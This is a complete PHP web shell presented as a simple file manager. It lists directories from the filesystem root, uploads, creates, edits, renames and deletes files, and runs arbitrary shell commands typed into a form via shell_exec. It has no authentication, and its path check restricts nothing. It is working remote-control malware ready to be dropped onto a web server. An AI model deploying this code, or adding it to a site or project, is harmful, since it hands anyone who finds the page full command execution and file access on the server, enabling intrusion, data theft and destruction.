<body style="background-color:powderblue;">
<?php
// Function to list the contents of the directory
function listDirectory($path) {
    if ($handle = opendir($path)) {
        echo "<ul>";
        while (false !== ($entry = readdir($handle))) {
            if ($entry != "." && $entry != "..") {
                $fullPath = $path . DIRECTORY_SEPARATOR . $entry;
                if (is_dir($fullPath)) {
                    echo "<li><a href='?dir=" . urlencode($fullPath) . "'>" . htmlspecialchars($entry) . "/</a></li>";
                } else {
                    echo "<li>" . htmlspecialchars($entry) . " 
                          <a href='?edit_file=" . urlencode($fullPath) . "'>[Edit]</a> 
                          <a href='?delete=" . urlencode($fullPath) . "' onclick=\"return confirm('Are you sure you want to delete this file?');\">[Delete]</a></li>";
                }
            }
        }
        echo "</ul>";
        closedir($handle);
    }
}

// Determine the current directory
$directory = isset($_GET['dir']) ? $_GET['dir'] : realpath($_SERVER['DOCUMENT_ROOT']);

// Function to ensure the directory is valid
function validatePath($path) {
    return realpath($path) !== false && strpos(realpath($path), realpath('/')) === 0;
}

// Handle file upload
$uploadedFilePath = '';
if (isset($_FILES['file'])) {
    $uploadPath = $directory . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
    if (validatePath($directory) && move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath)) {
        $uploadedFilePath = $uploadPath;
        echo "File uploaded successfully!<br/>";
    } else {
        echo "File upload failed!<br/>";
    }
}

// Handle file deletion
if (isset($_GET['delete'])) {
    $fileToDelete = $_GET['delete'];
    if (validatePath($fileToDelete) && is_file($fileToDelete)) {
        unlink($fileToDelete);
        echo "File deleted successfully!<br/>";
    } else {
        echo "File deletion failed!<br/>";
    }
}

// Handle file editing
if (isset($_GET['edit_file'])) {
    $fileToEdit = $_GET['edit_file'];
    if (validatePath($fileToEdit) && is_file($fileToEdit)) {
        $content = file_get_contents($fileToEdit);
        echo "<form method='post'>";
        echo "<textarea name='new_content' rows='10' cols='50'>" . htmlspecialchars($content) . "</textarea><br/>";
        echo "<input type='hidden' name='filename' value='" . htmlspecialchars($fileToEdit) . "'/>";
        echo "<input type='submit' name='save_file' value='Save'>";
        echo "</form>";
    } else {
        echo "File editing failed!<br/>";
    }
}

// Handle file saving after editing
if (isset($_POST['save_file'])) {
    $filename = $_POST['filename'];
    $newContent = $_POST['new_content'];
    if (validatePath($filename) && is_file($filename)) {
        file_put_contents($filename, $newContent);
        echo "File saved successfully!<br/>";
    } else {
        echo "File saving failed!<br/>";
    }
}

// Handle file renaming
if (isset($_GET['rename'])) {
    $fileToRename = $_GET['rename'];
    if (validatePath($fileToRename) && is_file($fileToRename)) {
        echo "<form method='post'>";
        echo "<input type='hidden' name='old_name' value='" . htmlspecialchars($fileToRename) . "'/>";
        echo "New Name: <input type='text' name='new_name' value='" . htmlspecialchars(basename($fileToRename)) . "'><br/>";
        echo "<input type='submit' name='rename_file' value='Rename'>";
        echo "</form>";
    } else {
        echo "File renaming failed!<br/>";
    }
}

// Handle renaming after form submission
if (isset($_POST['rename_file'])) {
    $oldName = $_POST['old_name'];
    $newName = dirname($oldName) . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
    if (validatePath($oldName) && is_file($oldName)) {
        if (rename($oldName, $newName)) {
            echo "File renamed successfully!<br/>";
        } else {
            echo "File renaming failed!<br/>";
        }
    } else {
        echo "File renaming failed!<br/>";
    }
}

// Handle command execution
if (isset($_POST['command'])) {
    $command = $_POST['command'];
    echo "<pre>";
    echo htmlspecialchars(shell_exec($command . " 2>&1"));
    echo "</pre>";
}

// Handle new file creation
if (isset($_POST['new_file_name'])) {
    $newFileName = $directory . DIRECTORY_SEPARATOR . basename($_POST['new_file_name']);
    if (validatePath($directory) && file_put_contents($newFileName, "") !== false) {
        echo "New file created successfully: " . htmlspecialchars(basename($newFileName)) . "<br/>";
    } else {
        echo "Failed to create new file!<br/>";
    }
}

// Display the contents of the directory
echo "<h3>Current Directory: " . htmlspecialchars($directory) . "</h3>";
listDirectory($directory);

// Display the "Navigate" path clickable for each segment
$pathSegments = explode(DIRECTORY_SEPARATOR, trim($directory, DIRECTORY_SEPARATOR));
$currentPath = "";
echo "<h3>Navigate:</h3>";
echo "<a href='?dir=" . urlencode('/') . "'>/</a> ";
foreach ($pathSegments as $index => $segment) {
    if ($segment != "") {
        $currentPath .= DIRECTORY_SEPARATOR . $segment;
        echo "<a href='?dir=" . urlencode($currentPath) . "'>" . htmlspecialchars($segment) . "</a>";
        if ($index < count($pathSegments) - 1) {
            echo " / ";
        }
    }
}

if ($uploadedFilePath) {
    echo "<h3>Uploaded File:</h3>";
    echo "<a href='" . htmlspecialchars($uploadedFilePath) . "'>" . htmlspecialchars($uploadedFilePath) . "</a><br/>";
}
?>

<h3>Upload a File:</h3>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>

<h3>Create a New File:</h3>
<form method="post">
    <input type="text" name="new_file_name" placeholder="Enter new file name">
    <input type="submit" value="Create File">
</form>

<h3>Execute a Command:</h3>
<form method="post">
    <input type="text" name="command" placeholder="Enter command">
    <input type="submit" value="Execute">
</form>
</body>